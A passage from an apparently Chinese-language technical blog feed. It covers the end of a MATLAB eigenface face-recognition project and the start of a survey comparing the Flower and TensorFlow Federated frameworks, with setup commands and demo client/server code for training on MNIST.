[rows, cols, numImages] = <span class="built_in">size</span>(images);</span><br><span class="line">    shiftedImages = images - <span class="built_in">repmat</span>(meanImage, [<span class="number">1</span>, <span class="number">1</span>, numImages]);</span><br><span class="line">    flatImages = <span class="built_in">reshape</span>(shiftedImages, rows * cols, numImages);</span><br><span class="line">    projectedImages = eigenVectors&#x27; * flatImages;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">\alpha_{ik} = \hat{V}_k^\top x_i</script><p>根据公式，我们<strong>将转置的特征向量乘到图像数组上</strong>即可</p><p>接着使用该函数将训练集与测试集均投影到特征空间</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">projectedTrainImages = projectToPCASpace(trainSet, meanImage, eigenVectors);</span><br><span class="line">fprintf(<span class="string">&#x27;训练集投影特征空间完毕\n&#x27;</span>);</span><br><span class="line">projectedTestImages = projectToPCASpace(testSet, meanImage, eigenVectors);</span><br><span class="line">fprintf(<span class="string">&#x27;测试集投影特征空间完毕\n&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="模板匹配"><a href="#模板匹配" class="headerlink" title="模板匹配"></a>模板匹配</h2><p>计算测试图像与训练图像在特征空间上的<strong>欧式距离</strong>，将其用作识别的判据</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">differences = projectedTrainImages - <span class="built_in">repmat</span>(testImage, [<span class="number">1</span>, <span class="built_in">size</span>(projectedTrainImages, <span class="number">2</span>)]);</span><br><span class="line">euclideanDistances = sum(differences.^<span class="number">2</span>);</span><br><span class="line">[~, closestImage] = <span class="built_in">min</span>(euclideanDistances);</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ceil</span>(closestImage / <span class="number">5</span>) == person</span><br><span class="line">personCorrectCount = personCorrectCount + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>选出其中欧氏距离最小的图像作为匹配结果，并判断是否与测试图像标签相同来计算准确率</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为了直观的显示中间结果，我们添加一段展示特征脸的代码</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 显示前20个特征脸</span></span><br><span class="line"><span class="built_in">figure</span>;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">20</span></span><br><span class="line">    <span class="comment">% 提取第i个特征向量并重塑形状</span></span><br><span class="line">    featureFace = <span class="built_in">reshape</span>(eigenVectors(:, <span class="built_in">i</span>), [rows, cols]);</span><br><span class="line">    featureFace = rescale(featureFace);</span><br><span class="line">    subplot(<span class="number">4</span>, <span class="number">5</span>, <span class="built_in">i</span>);</span><br><span class="line">    imshow(featureFace);</span><br><span class="line">    title(sprintf(<span class="string">&#x27;特征脸 %d&#x27;</span>, <span class="built_in">i</span>));</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后可以得到下图</p><img src="/posts/363598081c25/feature_faces.png" class="" title="feature_faces"><p>可以发现特征脸算是较为抽象的特征表示</p><p>接下来我们选取不同的特征维数来进行测试人脸识别准确率</p><p>我们只需<strong>将后续的投影以及模板匹配过程放在循环中</strong>即可</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 设置不同的特征维数进行测试</span></span><br><span class="line">featureDimensions = <span class="number">20</span>:<span class="number">39</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 存储每个维数的准确率</span></span><br><span class="line">accuracies = <span class="built_in">zeros</span>(<span class="built_in">size</span>(featureDimensions));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index = <span class="number">1</span>:<span class="built_in">length</span>(featureDimensions)</span><br><span class="line">    k = featureDimensions(index);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% 提取前k个特征向量</span></span><br><span class="line">    selectedEigenVectors = eigenVectors(:, <span class="number">1</span>:k);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% 投影到PCA特征空间并人脸识别</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    accuracy = correctCount / <span class="built_in">size</span>(projectedTestImages, <span class="number">2</span>);</span><br><span class="line">    accuracies(index) = accuracy;</span><br><span class="line">    fprintf(<span class="string">&#x27;特征维数 %d, 准确率: %.2f%%\n&#x27;</span>, k, accuracy * <span class="number">100</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面截取部分数据绘制成表格</p><div class="table-container"><table><thead><tr><th>特征维数</th><th>人脸识别准确率</th></tr></thead><tbody><tr><td>32</td><td>88.00%</td></tr><tr><td>33</td><td>88.50%</td></tr><tr><td>34</td><td>89.00%</td></tr><tr><td>35</td><td>89.50%</td></tr><tr><td>36</td><td>89.00%</td></tr><tr><td>37</td><td>88.50%</td></tr><tr><td>38</td><td>88.50%</td></tr></tbody></table></div><p>我们也可以将结果绘制成更直观的柱状图</p><img src="/posts/363598081c25/accuracy_bar_chart.png" class="" title="accuracy_bar_chart"><p>当特征维数为35时，准确率达到最高，这表明在这个维数下，选取的特征脸达到了最佳的泛化能力，有效地捕捉了人脸的关键特征，同时避免了过拟合。特征维数低于35时，可能由于特征信息不足，导致准确率下降，而高于35时，则可能由于引入不必要的噪声或冗余信息，导致准确率下降。</p><h2 id="不平均图像的情况"><a href="#不平均图像的情况" class="headerlink" title="不平均图像的情况"></a>不平均图像的情况</h2><p>当我们提取特征之前不对图片进行平均处理，此时可以获得更多的训练样本</p><p>在进行人脸识别之前，需要将同一id的人脸特征进行平均</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">40</span></span><br><span class="line">    avgProjectedTrainImages(:, <span class="built_in">i</span>) = <span class="built_in">mean</span>(projectedTrainImages((<span class="built_in">i</span><span class="number">-1</span>)*<span class="number">5</span>+<span class="number">1</span>:<span class="built_in">i</span>*<span class="number">5</span>, :), <span class="number">1</span>)&#x27;;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>我们再一次测试这种情况下特征数50-100的准确率</p><p>得到如下柱状图</p><img src="/posts/363598081c25/accuracy_bar_chart_withoutavg.png" class="" title="accuracy_bar_chart_withoutavg"><p>可以看到在93、94、99、100时达到最高准确率<code>84.5%</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐私计算开源框架调研</title>
      <link href="/posts/ec146cb37934/"/>
      <url>/posts/ec146cb37934/</url>
      
        <content type="html"><![CDATA[<p>本次调研的具体Demo测试代码我已上传到github上</p><p><a href="https://github.com/handsomelky/Federated-Learning-Frameworks-Comparison">handsomelky/Federated-Learning-Frameworks-Comparison (github.com)</a></p><h1 id="调研背景"><a href="#调研背景" class="headerlink" title="调研背景"></a>调研背景</h1><p>在当今数字化时代，数据和机器学习的应用无处不在，从智能医疗到个性化推荐系统。然而，这种广泛的数据利用引发了对个人隐私的严重关切。为解决这一问题，联邦学习应运而生，它作为隐私计算的一种重要形式，允许在不共享用户原始数据的情况下，跨多个设备和平台进行模型训练。</p><p>本次调研将围绕两个主要的开源联邦学习框架：<strong>Flower 和 TensorFlow Federated (TFF) </strong>展开。</p><h2 id="联邦学习"><a href="#联邦学习" class="headerlink" title="联邦学习"></a>联邦学习</h2><p>联邦学习是一种革命性的机器学习方法，它允许不同设备和组织在保持数据隐私的前提下共同训练模型。这种方法的核心在于模型的训练发生在本地，只有模型更新（而非原始数据）被发送到中心服务器进行聚合。这样不仅保护了数据隐私，还减少了数据传输的需要，提高了效率。</p><p>联邦学习具有下面这些特性：</p><ul><li><p><strong>多方参与</strong>：两个或两个以上的参与方合作构建共享的机器学习模型，每个参与方都拥有一部分数据用以训练模型</p></li><li><p><strong>不交换数据</strong>：在联邦学习训练过程中，任意一个参与方的任意原始数据不会离开该参与方，不会被直接交换和收集</p></li><li><p><strong>保护传输信息</strong>：在联邦学习训练过程中，训练所需的信息需要经过保护后在个参与方之间进行传输，使得各参与方无法基于传输的信息推测出其他参与方的数据</p></li><li><p><strong>近似无损</strong>：模型的量能要充分接近理想模型（即各参与方通过</p><p>直接合并数据训练得到的模型）的性能</p></li></ul><p>我们可以将联邦学习分为三种主要类型：<strong>横向联邦学习</strong>、<strong>纵向联邦学习</strong>以及<strong>联邦迁移学习</strong></p><h3 id="横向联邦学习"><a href="#横向联邦学习" class="headerlink" title="横向联邦学习"></a>横向联邦学习</h3><p><strong>本次调研运行的Demo均为横向联邦学习框架</strong></p><p>这里简要介绍一下横向联邦学习</p><p>横向联邦学习适用于数据持有者拥有相似特征但不同样本的情况，例如不同用户的手机数据</p><img src="/posts/ec146cb37934/a9d03be053ee240b0ccb63184db9fcda.png" class="" title="img"><p>横向联邦学习以数据的特征维度为导向，取出参与方特征相同而用户不完全相同的部分进行联合训练。在此过程中，通过各参与方之间的样本联合，<strong>扩大了训练的样本空间，从而提升了模型的准确度和泛化能力</strong>。</p><p>当然，想要在普通的模型测试中<strong>模拟横向联邦非常简单</strong>，我们只需将同一数据集分割成几份，作为不同的客户端上的数据即可</p><h3 id="客户-服务器架构"><a href="#客户-服务器架构" class="headerlink" title="客户-服务器架构"></a>客户-服务器架构</h3><p>横向和纵向是从参与方拥有的数据类型出发，对联邦学习进行分类</p><p>我们还需要关注具体架构</p><p>联邦学习有两种常用的架构：<strong>客户-服务器架构</strong>以及<strong>对等网络架构</strong></p><p><strong>客户-服务器架构</strong>也被称为主-从（master-worker）架构或者轮辐式（hub-and-spoke）架构。在这种系统中，具有同样数据结构的 K 个参与方（也叫作客户或用户）在服务器（也叫作参数服务器或者聚合服务器）的帮助下，协作地训练一个机器学习模型</p><img src="/posts/ec146cb37934/2c025f8a64564cdbabacbfe4277f5469.png" class="" title="2c025f8a64564cdbabacbfe4277f5469"><p><strong>步骤1</strong>：各参与方在本地计算模型梯度，并使用同态加密、差分隐私或秘密共享等加密技术，对梯度信息进行掩饰，并将掩饰后的结果（简称为加密梯度） 发送给聚合服务器。</p><p><strong>步骤2</strong>：服务器进行安全聚合（secure aggregation）操作，如使用基于同态加密的加权平均。</p><p><strong>步骤3</strong>：服务器将聚合后的结果发送给各参与方。</p><p><strong>步骤4</strong>：各参与方对收到的梯度进行解密，并使用解密后的梯度结果更新各自的模型参数。</p><p>当然除了聚合梯度，服务器端<strong>也可以对收到的模型参数进行聚合</strong></p><img src="/posts/ec146cb37934/image-20231220143615042.png" class="" title="image-20231220143615042"><h3 id="对等网络架构"><a href="#对等网络架构" class="headerlink" title="对等网络架构"></a>对等网络架构</h3><p>对等网络架构中不存在中央服务器或协调方</p><img src="/posts/ec146cb37934/image-20231220143953129.png" class="" title="image-20231220143953129"><p>每一个训练方负责只使用本地数据训练同一个机器学习模型（如DNN）</p><p>训练方使用安全链路（channels）在相互之间传输模型参数信息</p><h2 id="开源框架简介"><a href="#开源框架简介" class="headerlink" title="开源框架简介"></a>开源框架简介</h2><h3 id="Flower"><a href="#Flower" class="headerlink" title="Flower"></a>Flower</h3><p><style>.zobpmdkwlwxg{zoom:25%;}</style><img src="/posts/ec146cb37934/flower.webp" class="zobpmdkwlwxg" alt="flower"></p><p>Flower 是一个轻量的联邦学习框架，提出于 2020 年。一直以来，因为设计良好，方便扩展受到了比较多的关注。</p><p>框架设计主要追求下面目标：</p><ol><li>可拓展，支持大量的客户端同时进行模型训练；</li><li>使用灵活，支持异构的客户端，通信协议，隐私策略，支持新功能的开销小；</li></ol><p><strong>官网</strong>：<a href="https://flower.dev/docs/framework/index.html">Flower Framework main</a></p><p><strong>github源码链接</strong>：<a href="https://github.com/adap/flower">adap/flower: Flower: A Friendly Federated Learning Framework (github.com)</a></p><p>当然，之所以选择调研flower，也是因为它的官方教程较为完善、社区活跃。</p><h3 id="TFF"><a href="#TFF" class="headerlink" title="TFF"></a>TFF</h3><p><style>.omgpcvkmyhgn{zoom:25%;}</style><img src="/posts/ec146cb37934/tf-logo-card-16x9.png" class="omgpcvkmyhgn" alt="img"></p><p>TensorFlow Federated（TFF）是一个开源框架，用于对分散数据实验机器学习和其他计算。TensorFlow Federated使开发人员能够表达和模拟联邦学习系统。</p><p><strong>官网</strong>：<a href="https://tensorflow.google.cn/federated?hl=zh-cn">TensorFlow Federated (google.cn)</a></p><p><strong>github源码链接</strong>：<a href="https://github.com/tensorflow/federated">tensorflow/federated: A framework for implementing federated learning (github.com)</a></p><h1 id="框架分析"><a href="#框架分析" class="headerlink" title="框架分析"></a>框架分析</h1><p>我们先从两个框架的官方文档以及论文入手，分析这些框架的特点以及优势。当然，<strong>更多特性需要我们后续运行Demo之后才能观察到</strong>。</p><h2 id="Flower-1"><a href="#Flower-1" class="headerlink" title="Flower"></a>Flower</h2><p>想要深入了解Flower这个开源框架，还是需要我们自己去阅读背后的论文</p><p><strong><em>FLOWER: A FRIENDLY FEDERATED LEARNING FRAMEWORK</em></strong></p><p>论文链接如下：</p><p><a href="https://arxiv.org/pdf/2007.14390.pdf">2007.14390.pdf (arxiv.org)</a></p><p>从论文的摘要部分我们可以了解到，Flower框架的<strong>核心优势在于它支持大规模的联合学习实验</strong>，这对于在现实世界条件下，尤其是在设备性能和网络连接存在巨大差异的情况下，进行研究和实验至关重要。这种框架<strong>能够处理高达数百万级别的客户端</strong>，这对于研究和开发具有深远的意义，因为它允许研究者在真实世界的复杂环境中测试和优化他们的FL算法。此外，它还提供了一个平滑的过渡路径，使研究者能够从大规模模拟实验轻松迁移到真实设备上的实际应用。这表明Flower框架非常注重实用性和灵活性，适合在多种环境下进行FL研究和实践。</p><p>Flower框架的设计理念强调了在实际环境中，特别是在边缘计算环境中实施联合学习的挑战。与其他集中在云计算或数据中心的框架不同，<strong>Flower更加注重边缘设备的异构性和环境因素</strong>。这种方法能更好地反映真实世界中设备的多样性和网络条件的不确定性，使FL算法更加健壮和实用。</p><img src="/posts/ec146cb37934/image-20231220161913275.png" class="" title="image-20231220161913275"><p>Flower框架<strong>采用客户端-服务器架构</strong>，支持不同类型的设备和操作系统。它提供了高度模块化的设计，允许在不同级别上定制FL算法。Flower还支持跨平台部署，包括移动设备和嵌入式系统，当然<strong>这些内容无法在本次调研中测试到</strong>。</p><h2 id="FFT"><a href="#FFT" class="headerlink" title="FFT"></a>FFT</h2><p>谷歌作为联邦学习的提出者，在其深度学习框架TensorFlow的基础上开发出了一套联邦学习的框架Tensorflow Federated（TFF）</p><p>所以与Flower框架相比，TFF<strong>对tensorflow深度学习框架的支持性更好，同时也更具专业性</strong></p><img src="/posts/ec146cb37934/image-20231220164731851.png" class="" title="image-20231220164731851"><p>TensorFlow Federated使开发人员能够表达和模拟联邦学习系统。如图所示，每个手机在本地训练模型（A），将它们的更新汇总到（B），然后形成改进的共享模型（C）。</p><p>在浏览官方网站与文档之后，我也体会到了下面几点优势</p><ol><li><strong>灵活性和扩展性</strong>：TFF 提供灵活的 API，支持广泛的机器学习模型和算法，易于扩展和自定义。</li><li><strong>与 TensorFlow 的集成</strong>：TFF 与 TensorFlow 紧密集成，使得开发者可以轻松利用 TensorFlow 的功能和生态系统。</li><li><strong>函数式编程模型</strong>：提高代码的抽象度和复用性。</li><li><strong>灵活的模型和数据处理</strong>：支持复杂的机器学习模型和数据处理流程。</li></ol><p>TFF同样是<strong>采用客户端-服务器架构</strong>，专注于保持数据的隐私性和局部性。</p><p>而且，TFF与原生的python库不同，它有许多自己定义的操作和数据结构</p><p>例如在定义函数前，我们可以使用<code>@tf.function</code>装饰器，将普通的Python函数转换为TensorFlow图（Graph）操作。这种转换有以下几个优点：</p><ol><li><strong>性能提升</strong>：图执行允许TensorFlow进行更多的优化，例如并行化和分布式执行，从而提高运行效率。</li><li><strong>可移植性</strong>：图操作可以跨不同的平台和硬件（如CPU、GPU、TPU）无缝运行，增强了代码的可移植性。</li><li><strong>自动微分支持</strong>：使用图可以更容易地利用TensorFlow的自动微分（autodiff）功能，这对于训练深度学习模型尤其重要。</li></ol><p>当然，我们也可以通过阅读TFF背后的论文来深入了解它</p><p>论文链接如下：</p><p><a href="https://arxiv.org/pdf/1902.01046.pdf">1902.01046.pdf (arxiv.org)</a></p><img src="/posts/ec146cb37934/image-20231222084543366.png" class="" title="image-20231222084543366"><p>论文中的这张图可以算是google提出的联邦学习技术的核心：图中展示了联邦学习服务器架构中的不同参与者。流程开始于协调者（Coordinator），它负责整个过程的协调。协调者创建主聚合器，它是一个长期存在的参与者，用于创建和管理聚合器。聚合器是短暂的参与者，它们负责从选择器（Selector）处接收设备的模型更新。选择器是连接设备的接口，负责选择哪些设备参与本轮学习。整个架构设计为循环流程，以支持持续的模型训练和更新。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在分析代码和运行教程Demo前，我们需要分别搭建这两个开源框架的环境</p><p>在本次调研中，为了对比不同开源框架的效率，我们需要选用相同的深度学习框架、神经网络模型以及数据集</p><p><strong>深度学习框架我们选用Tensorflow</strong></p><h2 id="Flower-2"><a href="#Flower-2" class="headerlink" title="Flower"></a>Flower</h2><p>首先我们使用conda包管理创建一个测试用的环境，并安装Tensorflow框架</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n Flower python=3.8</span><br><span class="line">conda activate Flower</span><br><span class="line">pip install tensorflow</span><br></pre></td></tr></table></figure><p>使用以下指令为环境安装flower</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flwr</span><br><span class="line">pip install flwr_datasets</span><br></pre></td></tr></table></figure><p>最后可以执行<code>pip list</code>来验证安装完整性</p><img src="/posts/ec146cb37934/image-20231220172807606.png" class="" title="image-20231220172807606"><h2 id="TFF-1"><a href="#TFF-1" class="headerlink" title="TFF"></a>TFF</h2><p>同样，我们使用conda包管理创建一个测试用的环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n TFF python=3.7</span><br><span class="line">conda activate TFF</span><br></pre></td></tr></table></figure><p>需要注意的是，tensorflow的版本需要依靠TFF的版本来指定，且安装TFF时会自动安装对于的tensorflow，所以可以先不装tensorflow</p><p><strong>由于Demo中使用cpu来跑，所以并不需要太在意tensorflow与你的CUDA版本对应问题</strong></p><p>使用以下指令为环境安装TFF</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tensorflow-federated==0.13.1</span><br></pre></td></tr></table></figure><p>这里去掉了官方教程指令中的<code>--quiet</code>选项，目的是为了更清晰地观察安装进度，如果安装中途出错更好定位原因</p><img src="/posts/ec146cb37934/image-20231220210309912.png" class="" title="image-20231220210309912"><h1 id="代码剖析及改进"><a href="#代码剖析及改进" class="headerlink" title="代码剖析及改进"></a>代码剖析及改进</h1><p>两个开源框架均选择<strong>训练MNIST数据集</strong></p><h2 id="Flower-3"><a href="#Flower-3" class="headerlink" title="Flower"></a>Flower</h2><p>Flower的测试代码非常简洁和直观，同时也能<strong>更好地反应服务端和客户端之间的通信和交互</strong></p><p>客户端的代码为<code>Flower_client.py</code></p><p>首先加载模型和数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(x_train, y_train), (x_test, y_test) = tf.keras.datasets.cifar10.load_data()</span><br><span class="line"></span><br><span class="line">model = tf.keras.applications.MobileNetV2((<span class="number">32</span>, <span class="number">32</span>, <span class="number">3</span>), classes=<span class="number">10</span>, weights=<span class="literal">None</span>)</span><br><span class="line">model.<span class="built_in">compile</span>(<span class="string">&quot;adam&quot;</span>, <span class="string">&quot;sparse_categorical_crossentropy&quot;</span>, metrics=[<span class="string">&quot;accuracy&quot;</span>])</span><br></pre></td></tr></table></figure><p>接着是训练过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CifarClient</span>(fl.client.NumPyClient):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_parameters</span>(<span class="params">self, config</span>):</span><br><span class="line">        <span class="keyword">return</span> model.get_weights()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self, parameters, config</span>):</span><br><span class="line">        model.set_weights(parameters)</span><br><span class="line">        model.fit(x_train, y_train, epochs=<span class="number">30</span>, batch_size=<span class="number">32</span>, steps_per_epoch=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> model.get_weights(), <span class="built_in">len</span>(x_train), &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">evaluate</span>(<span class="params">self, parameters, config</span>):</span><br><span class="line">        model.set_weights(parameters)</span><br><span class="line">        loss, accuracy = model.evaluate(x_test, y_test)</span><br><span class="line">        <span class="keyword">return</span> loss, <span class="built_in">len</span>(x_test), &#123;<span class="string">&quot;accuracy&quot;</span>: <span class="built_in">float</span>(accuracy)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>包括了从服务端获取并设置参数、训练以及评估模型等过程</p><p>最后则是<strong>连接服务器端口</strong>的部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl.client.start_numpy_client(server_address=<span class="string">&quot;127.0.0.1:8080&quot;</span>, client=CifarClient())</span><br></pre></td></tr></table></figure><p>因为给出了地址，所以能够非常好地模拟实际场景中客户端与服务端的通信</p><p>服务端的代码为<code>Flower_server.py</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from typing import List, Tuple</span><br><span class="line"></span><br><span class="line">import flwr as fl</span><br><span class="line">from flwr.common import Metrics</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Define metric aggregation function</span><br><span class="line">def weighted_average(metrics: List[Tuple[int, Metrics]]) -&gt; Metrics:</span><br><span class="line">    # Multiply accuracy of each client by number of examples used</span><br><span class="line">    accuracies = [num_examples * m[&quot;accuracy&quot;] for num_examples, m in metrics]</span><br><span class="line">    examples = [num_examples for num_examples, _ in metrics]</span><br><span class="line"></span><br><span class="line">    # Aggregate and return custom metric (weighted average)</span><br><span class="line">    return &#123;&quot;accuracy&quot;: sum(accuracies) / sum(examples)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Define strategy</span><br><span class="line">strategy = fl.server.strategy.FedAvg(evaluate_metrics_aggregation_fn=weighted_average)</span><br><span class="line"></span><br><span class="line"># Start Flower server</span><br><span class="line">fl.server.start_server(</span><br><span class="line">    server_address=&quot;0.0.0.0:8080&quot;,</span><br><span class="line">    config=fl.server.ServerConfig(num_rounds=3),</span><br><span class="line">    strategy=strategy,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>只有非常简短的几行，可见<strong>Flower框架的API高度集成</strong>，搭建联邦学习时非常方便</p><p>其中比较重要的部分即权值平均</p><p>那么由于原Demo跑的数据集为cifar10</p><p>我们需要<strong>修改客户端代码，使其训练mnist</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()</span><br></pre></td></tr></table></figure><p>同时我们还需要修改模型，<strong>使用与TFF的Demo相同的模型结构</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">model = tf.keras.Sequential()</span><br><span class="line">model.add(layers.Flatten(input_shape=(<span class="number">28</span>, <span class="number">28</span>)))</span><br><span class="line">model.add(layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译模型</span></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">True</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure><h2 id="TFF-2"><a href="#TFF-2" class="headerlink" title="TFF"></a>TFF</h2><p>TFF的教程Demo我选择的是《自定义联合算法第2部分-实现联合平均算法》</p><p>教程地址：<a href="https://tensorflow.google.cn/federated/tutorials/custom_federated_algorithms_2?hl=zh-cn">自定义联合算法，第 2 部分：实现联合平均  | TensorFlow Federated (google.cn)</a></p><p>首先是对一些库函数的引入，这里要注意的是，后续使用到TFF库时都会使用缩写<code>tff</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow_federated <span class="keyword">as</span> tff</span><br></pre></td></tr></table></figure><p>导入用于训练的MNIST数据集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mnist_train, mnist_test = tf.keras.datasets.mnist.load_data()</span><br></pre></td></tr></table></figure><p>我们将客户端数量定义为2，保持其与Flower的Demo中的客户端个数相同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NUM_EXAMPLES_PER_USER = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>接下来使用<code>get_data_for_digit()</code>方法将原MNIST数据集按客户端数量分为<code>NUM_EXAMPLES_PER_USER</code>份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data_for_digit</span>(<span class="params">source, digit</span>):</span><br><span class="line">    output_sequence = []</span><br><span class="line">    all_samples = [i <span class="keyword">for</span> i, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(source[<span class="number">1</span>]) <span class="keyword">if</span> d == digit]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="built_in">len</span>(all_samples), NUM_EXAMPLES_PER_USER), BATCH_SIZE):</span><br><span class="line">        batch_samples = all_samples[i:i + BATCH_SIZE]</span><br><span class="line">        output_sequence.append(&#123;</span><br><span class="line">            <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                np.array([source[<span class="number">0</span>][i].flatten() / <span class="number">255.0</span> <span class="keyword">for</span> i <span class="keyword">in</span> batch_samples],</span><br><span class="line">                         dtype=np.float32),</span><br><span class="line">            <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">                np.array([source[<span class="number">1</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> batch_samples], dtype=np.int32)</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">return</span> output_sequence</span><br></pre></td></tr></table></figure><p>每一份为由字典组成的列表，<strong>字典的键为图像数组，值为对应label</strong></p><p>在定义损失函数之前，我们还需要定义输入和输出的类型，即<strong>TFF命名元组</strong></p><p>与 Python 